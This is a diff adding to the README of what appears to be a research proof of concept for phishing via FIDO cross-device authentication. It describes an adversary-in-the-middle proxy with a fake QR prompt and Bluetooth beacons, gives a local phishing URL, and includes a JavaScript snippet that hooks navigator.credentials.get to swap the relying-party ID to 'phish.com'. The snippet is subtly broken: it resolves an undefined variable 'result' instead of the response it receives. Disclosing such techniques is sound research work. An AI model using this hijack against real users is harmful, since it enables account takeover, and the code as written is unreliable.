@@ -1,3 +1,11 @@
+## TL; DR;
+This is a PoC for a phishing technique using FIDO cross‑device (hybrid) authentication. An attacker can run an AitM proxy that shows a fake, OS‑like QR code prompt in the browser. The attack requires placing one or more Bluetooth beacons within the victim’s Bluetooth range.
+
+You can find more details in the [Blog Post](https://denniskniep.github.io/posts/14-fido-cross-device-phishing/)
+
+## Demo
+https://youtu.be/kbv4-6qaR6g
+
 ## Local Testing
 
 ### dns
@@ -54,3 +62,21 @@ go run ./ start
 ### Open Phishing Url
 * https://login.my-phishing-site.com/DZwkbKWF
 
+
+### Prototype with JavaScript in DeveloperTools
+```
+var orig = navigator.credentials.get
+navigator.credentials.get = function(req){
+    return new Promise((resolveOuter) => {
+    console.log(req);
+    navigator.credentials.get = orig
+    req.publicKey.rpId = "phish.com"
+    navigator.credentials.get(req)
+        .then(resp => {
+            console.log(result)
+            resolveOuter(result);
+        })
+        .catch(err => console.log(err));
+    });
+}
+```
